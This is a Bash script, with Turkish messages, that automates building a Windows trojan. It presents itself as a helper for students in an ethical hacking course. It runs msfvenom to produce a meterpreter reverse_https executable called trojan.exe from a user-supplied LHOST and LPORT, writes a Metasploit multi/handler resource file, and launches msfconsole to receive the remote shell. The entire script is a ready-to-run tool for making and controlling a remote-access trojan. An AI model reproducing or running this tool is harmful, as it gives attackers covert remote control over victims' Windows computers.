lightblue=`tput setaf 14` 
green=`tput setaf 46`     
RED=`tput setaf 196`      
yellow=`tput setaf 11`    
purple=`tput setaf 129`   
reset=`tput sgr0` 
clear
echo "${green}Bu Araç Etik Hacker Olma Kursunda Trojan Oluşturmada Sıkıntı Yaşayan Öğrenciler İçin Oluşturulmuştur"
private_ip=$(sudo ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
read -p "${green}[+]${lightblue}LHOST[Default:$private_ip]-->" ip
read -p "${green}[+]${lightblue}LPORT-->" port
if [[ $ip = "" || $ip = " " ]];then
    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$private_ip LPORT=$port -f exe > trojan.exe
    echo use exploit/multi/handler > Metasploit/trojanolusturucu.rc
    echo set LHOST $private_ip >> Metasploit/trojanolusturucu.rc
    echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/trojanolusturucu.rc
    echo set LPORT $port >> Metasploit/trojanolusturucu.rc
    echo exploit -j -z >> Metasploit/trojanolusturucu.rc
    clear
    echo -e "${green}[!]${purple}Trojan Bilgileri '${yellow}trojan_bilgiler.txt' ${purple}klasöründe bulunuyor."
    echo -e "${green}[!]${purple}Trojan Bulunduğun Klasör İçerisinde '${yellow}trojan.exe' ${purple}olarak oluşturuldu"
    echo -e "${green}[+]Payload:${yellow} windows/meterpreter/reverse_https"
    echo -e "${green}[+]Exploit:${yellow}  exploit/multi/handler"
    echo -e "${green}[+]Ip:${yellow} $private_ip"
    echo -e "${green}[+]Port:${yellow} $port"
    echo "windows/meterpreter/reverse_https" > trojan_bilgileri.txt
    echo "exploit/multi/handler" >> trojan_bilgileri.txt
    echo $private_ip >> trojan_bilgileri.txt
    echo $port >> trojan_bilgileri.txt
else
    sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > trojan.exe
    echo use exploit/multi/handler > Metasploit/trojanolusturucu.rc
    echo set PAYLOAD windows/meterpreter/reverse_https >> Metasploit/trojanolusturucu.rc
    echo set LHOST $ip >> Metasploit/trojanolusturucu.rc
    echo set LPORT $port >> Metasploit/trojanolusturucu.rc
    echo exploit -j -z >> Metasploit/trojanolusturucu.rc
    clear
    echo -e "${green}[!]${purple}Trojan Bilgileri '${yellow}trojan_bilgiler.txt' ${purple}klasöründe bulunuyor."
    echo -e "${green}[!]${purple}Trojan Bulunduğun Klasör İçerisinde '${yellow}trojan.exe' ${purple}olarak oluşturuldu"
    echo -e "${green}[+]Payload: ${yellow} windows/meterpreter/reverse_https"
    echo -e "${green}[+]Exploit: ${yellow} exploit/multi/handler"
    echo -e "${green}[+]Ip: ${yellow} $ip"
    echo -e "${green}[+]Port: ${yellow} $port"
    echo "windows/meterpreter/reverse_https" > trojan_bilgileri.txt
    echo "exploit/multi/handler" >> trojan_bilgileri.txt
    echo $ip >> trojan_bilgileri.txt
    echo $port >> trojan_bilgileri.txt
fi
echo -e "${green}[!]Metasploit Framework Açılıyor.."
echo -e "${green}[!]Handler Session Error Alan Arkadaşlar Programı Yeniden Başlatıp Port Numarasını Değiştirsinler."
sudo msfconsole -r Metasploit/trojanolusturucu.rc